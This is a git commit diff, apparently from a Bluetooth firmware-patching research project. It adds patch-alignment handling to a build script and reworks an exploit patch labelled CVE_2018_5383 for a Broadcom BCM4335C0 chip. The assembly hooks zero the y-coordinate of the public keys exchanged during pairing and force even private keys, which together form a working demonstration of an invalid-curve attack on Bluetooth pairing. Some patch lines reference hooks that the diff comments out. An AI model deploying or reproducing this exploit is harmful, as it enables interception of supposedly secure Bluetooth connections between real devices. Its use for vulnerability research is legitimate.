39c2193fa8406b39a38b197e47408e12da2334b9
Kristoffer Schneider <kschneider@codingfalx.de>
2018-12-31 00:18:14 +0100

    Added patch-alignment handling to the make process. Modified CVE_2018_5383 so it is possible to execute it

--- buildtools/scripts/nexmon.mk.2_bt.awk
+++ buildtools/scripts/nexmon.mk.2_bt.awk
@@ -16,16 +16,32 @@
 BEGIN {
 	patch_nr = initial_patch_nr;
 }
+function printPatchPrefix(address)
 {
-    if(patch_nr == 115){
-        patch_nr = 118    
-    }
+    byte_0 = rshift(and(address, 0xff000000), 24);
+    byte_1 = rshift(and(address, 0x00ff0000), 16);
+    byte_2 = rshift(and(address, 0x0000ff00), 8);
+    byte_3 = and(address,        0x000000ff);
+    printf("\t$(Q)echo -en '\\x08\\x0f\\x00\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x' > gen/hcd_extracted/rompatches/rompatch_nr%04d_0x08.bin\n",
+            patch_nr, byte_3, byte_2, byte_1, byte_0, 5000 + patch_nr);
+}
+function printPatchSuffix()
+{
+    printf("\t$(Q)echo -en '\\x00\\x00\\x00\\x00\\x00\\x00' >> gen/hcd_extracted/rompatches/rompatch_nr%04d_0x08.bin\n", 5000 + patch_nr)
+}
+function printPatchCat(input)
+{
+    printf("\t$(Q)cat " patch_input " >> gen/hcd_extracted/rompatches/rompatch_nr%04d_0x08.bin\n", 
+           patch_input, 5000 + patch_nr)
+    
+}
+{
 	if ($2 == "PATCH") {
 		print "\t$(Q)$(CC)objcopy -O binary -j .text." $4 " $< gen/section.bin && dd if=gen/section.bin of=$@ bs=1 conv=notrunc seek=$$((" $1 " - " ramstart "))\n\t$(Q)printf \"  PATCH " $4 " @ " $1 "\\n\"";
 		# Handling of patches which need to be written to the rom.
         # Since this is not directly possible we need to create rompatch files to be written to the
         # ram (see rampatch mechanism).
-        if ($1 <= 0x90000 || ($1 >= 0x260000 && $1 <= 0x268000)) {
+        if ($1 <= 0x90000 || ($1 >= 0x260000 && $1 <= 0x268000)) {   
             # rampatch mechanism
             # All data written to the file is in little-endian, documenation below is big-endian for
             # a better legibility:
@@ -33,13 +49,33 @@ BEGIN {
             # 0x000f         - 2 bytes - size of rom patch entries is static: 15
             # patch-number   - 1 byte  - alias patch slot-number 
             # target-address - 4 bytes - target address where the patch should be applied
-			printf("\t$(Q)echo -en '\\x08\\x0f\\x00\\x%02x\\x%s\\x%s\\x%s\\x%s' > gen/hcd_extracted/rompatches/rompatch_nr%04d_0x08.bin\n", 
-					patch_nr, substr($1,9,2), substr($1,7,2), substr($1,5,2), substr($1,3,2), 5000 + patch_nr)
             # patch value    - 4 bytes - the new value which will be patched to the target address
-			printf("\t$(Q)cat gen/section.bin >> gen/hcd_extracted/rompatches/rompatch_nr%04d_0x08.bin\n", 5000 + patch_nr)
             # empty bytes    - 2 bytes - two bytes. filler?
             # unknown        - 4 bytes - some bytes with unknown usage
-			printf("\t$(Q)echo -en '\\x00\\x00\\x00\\x00\\x00\\x00' >> gen/hcd_extracted/rompatches/rompatch_nr%04d_0x08.bin\n", 5000 + patch_nr)
+			
+            alignment = $1 % 4;
+            if(alignment > 0){
+                aligned = $1 - alignment
+                aligned_next = aligned + 4
+                printf("\tpython $(NEXMON_ROOT)/buildtools/scripts/bt_patch_alignment.py %#08x gen/section.bin gen/aligned_patch\n", $1)
+                printPatchPrefix(aligned)
+                #printPatchCat("gen/aligned_patch_one")
+                printf("\t$(Q)cat gen/aligned_patch_one >> gen/hcd_extracted/rompatches/rompatch_nr%04d_0x08.bin\n", 5000 + patch_nr);
+                printPatchSuffix()
+                patch_nr += 1
+                printPatchPrefix(aligned_next)
+                #printPatchCat("gen/aligned_patch_two")
+                printf("\t$(Q)cat gen/aligned_patch_two >> gen/hcd_extracted/rompatches/rompatch_nr%04d_0x08.bin\n", 5000 + patch_nr);
+                printPatchSuffix()
+                
+            } else {
+                #printf("\t$(Q)echo -en '\\x08\\x0f\\x00\\x%02x\\x%s\\x%s\\x%s\\x%s' > gen/hcd_extracted/rompatches/rompatch_nr%04d_0x08.bin\n", 
+	    		#		patch_nr, substr($1,9,2), substr($1,7,2), substr($1,5,2), substr($1,3,2), 5000 + patch_nr)
+                printPatchPrefix($1)
+			    printf("\t$(Q)cat gen/section.bin >> gen/hcd_extracted/rompatches/rompatch_nr%04d_0x08.bin\n", 5000 + patch_nr)
+			    #printf("\t$(Q)echo -en '\\x00\\x00\\x00\\x00\\x00\\x00' >> gen/hcd_extracted/rompatches/rompatch_nr%04d_0x08.bin\n", 5000 + patch_nr)
+                printPatchSuffix()
+            }
 			patch_nr += 1
 		} else {
             # no rom patch so we can simply create a writeram patch.
--- patches/bluetooth/bcm4335c0/nexmon/CVE_2018_5383/src/patch.c
+++ patches/bluetooth/bcm4335c0/nexmon/CVE_2018_5383/src/patch.c
@@ -13,64 +13,126 @@
 #include <firmware_version.h>
 #include <patcher.h>
 
-__attribute__((at(HOOKS_LOCATION, "", CHIP_VER_BCM4335C0_BT, FW_VER_1_BT)))
+__attribute__((at(HOOKS_LOCATION, "", CHIP_VER_BCM4335C0_BT)))
 __attribute__((optimize("O0")))
-void pk_recv_hook(void) {
-	__asm__(  "nop\n\t"
-		"push {r0-r3,lr}\n\t"
-	    "strb.w  r0, [r4, 170]\n\t"
-	    "ldr r0, =0x205614\n\t"
-	    "mov r1, 6\n\t"
-	    "mov r2, 0\n"
-	  "loop1:\n\t"
-	    "str r2, [r0]\n\t"
-	    "add r0, 4\n\t"
-	    "subs r1, 1\n\t"
-	    "bne  loop1\n\t"
-	    "pop {r0-r3,pc}\n");
+void cve(void){
+	__asm__(
+				"b pk_recv_hook\n\t"
+				"b pk_send_hook\n\t"
+				"b gen_priv_key\n"
+				// overwrite y-coordinate of received PK point
+			"pk_recv_hook:\n\t"
+				"push {r0-r3,lr}\n\t"
+				"strb.w  r0, [r4, 170]\n\t"
+				"ldr r0, =0x205614\n\t"
+				"mov r1, 6\n\t"
+				"mov r2, 0\n"
+			"loop1:\n\t"
+				"str r2, [r0]\n\t"
+				"add r0, 4\n\t"
+				"subs r1, 1\n\t"
+				"bne  loop1\n\t"
+				"pop {r0-r3,pc}\n"
+				// overwrite y-coordinate of own PK point before sending it out
+			"pk_send_hook:\n\t"
+				"add r2, r0, 24\n\t"
+				"mov r3, 0\n\t"
+				"mov r1, 6\n"
+			"loop2:\n\t"
+				"str r3, [r2]\n\t"
+				"add r2, 4\n\t"
+				"subs r1, 1\n\t"
+				"bne  loop2\n\t"
+				"b 0x2FFC4\n"
+				// generate a priv key which is always even
+			"gen_priv_key:\n\t"
+				"push {r4,lr}\n\t"
+				"mov r3, r0\n\t"
+				"mov r4, r1\n"
+			"generate:\n\t"
+				"mov r0, r3\n\t"
+				"mov r1, r4\n\t"
+				"bl 0x48E96\n\t"  // generate new priv key
+				"ldr  r2, [r3]\n\t"
+				"ands r2, 0x1\n\t"
+				"bne generate\n\t"
+				"pop  {r4,pc}\n\t"
+				);
 }
+
+
+//__attribute__((at(HOOKS_LOCATION, "", CHIP_VER_BCM4335C0_BT, FW_VER_1_BT)))
+//__attribute__((optimize("O0")))
+//void pk_recv_hook(void) {
+//	__asm__(
+//		"push {r0-r3,lr}\n\t"
+//	    "strb.w  r0, [r4, 170]\n\t"
+//	    "ldr r0, =0x205614\n\t"
+//	    "mov r1, 6\n\t"
+//	    "mov r2, 0\n"
+//	  "loop1:\n\t"
+//	    "str r2, [r0]\n\t"
+//	    "add r0, 4\n\t"
+//	    "subs r1, 1\n\t"
+//	    "bne  loop1\n\t"
+//	    "pop {r0-r3,pc}\n");
+//}
 
 __attribute__((at(PK_RECV_HOOK_ADDRESS, "", CHIP_VER_BCM4335C0_BT, FW_VER_1_BT)))
-BLPatch(pk_recv_hook, pk_recv_hook + 1);
+BLPatch(pk_recv_hook, 0xd7800 + 4);
 
 
-__attribute__((at(HOOKS_LOCATION + 50, "", CHIP_VER_BCM4335C0_BT, FW_VER_1_BT)))
-__attribute__((optimize("O0")))
-void pk_send_hook(void){
-  __asm__( "nop\n\t"
-	   "add r2, r0, 24\n\t"
-	   "mov r3, 0\n\t"
-	   "mov r1, 6\n"
-	  "loop2:\n\t"
-	   "str r3, [r2]\n\t"
-	   "add r2, 4\n\t"
-	   "subs r1, 1\n\t"
-	   "bne  loop2\n\t"
-	   "b 0x2FFC4");
+//__attribute__((at(HOOKS_LOCATION + 52, "", CHIP_VER_BCM4335C0_BT, FW_VER_1_BT)))
+//__attribute__((optimize("O0")))
+//void pk_send_hook(void){
+//  __asm__( "nop\n\t"
+//	   "add r2, r0, 24\n\t"
+//	   "mov r3, 0\n\t"
+//	   "mov r1, 6\n"
+//	  "loop2:\n\t"
+//	   "str r3, [r2]\n\t"
+//	   "add r2, 4\n\t"
+//	   "subs r1, 1\n\t"
+//	   "bne  loop2\n\t"
+//	   "b 0x2FFC4");
 
-}
+//}
 
-//__attribute__((at(PK_SEND_HOOK_ADDRESS, "", CHIP_VER_BCM4335C0_BT, FW_VER_1_BT)))
-//BLPatch(pk_send_hook, pk_send_hook + 1)
+__attribute__((at(PK_SEND_HOOK_ADDRESS, "", CHIP_VER_BCM4335C0_BT, FW_VER_1_BT)))
+BLPatch(pk_send_hook, 0xd7800 + 6)
 
 
-__attribute__((at(HOOKS_LOCATION + 100, "", CHIP_VER_BCM4335C0_BT, FW_VER_1_BT)))
-__attribute__((optimize("O0")))
-void gen_priv_key_hook(void){
-  __asm__( "nop\n\t"
-	   "push {r4,lr}\n\t"
-	   "mov r3, r0\n\t"
-	   "mov r4, r1\n"
-	  "generate:\n\t"
-	   "mov r0, r3\n\t"
-	   "mov r1, r4\n\t"
-	   "bl 0x48E96\n\t"  // generate new priv key
-	   "ldr  r2, [r3]\n\t"
-	   "ands r2, 0x1\n\t"
-	   "bne generate\n\t"
-	   "pop  {r4,pc}\n\t");
-}
+//__attribute__((at(HOOKS_LOCATION + 100, "", CHIP_VER_BCM4335C0_BT, FW_VER_1_BT)))
+//__attribute__((optimize("O0")))
+//void gen_priv_key_hook(void){
+//  __asm__(
+//	   "push {r4,lr}\n\t"
+//	   "mov r3, r0\n\t"
+//	   "mov r4, r1\n"
+//	  "generate:\n\t"
+//	   "mov r0, r3\n\t"
+//	   "mov r1, r4\n\t"
+///	   "bl 0x48E96\n\t"  // generate new priv key
+//	   "ldr  r2, [r3]\n\t"
+///	   "ands r2, 0x1\n\t"
+//	   "bne generate\n\t"
+//	   "pop  {r4,pc}\n\t"
+//	   );
+//}
 
-//__attribute__((at(GEN_PRIV_KEY_ADDRESS, "", CHIP_VER_BCM4335C0_BT, FW_VER_1_BT)))
-//BLPatch(gen_priv_key_hook, gen_priv_key_hook + 1)
+__attribute__((at(GEN_PRIV_KEY_ADDRESS, "", CHIP_VER_BCM4335C0_BT, FW_VER_1_BT)))
+BLPatch(gen_priv_key_hook, 0xd7800 + 8)
+
+
+
+
+
+
+
+
+
+
+
+
+
 
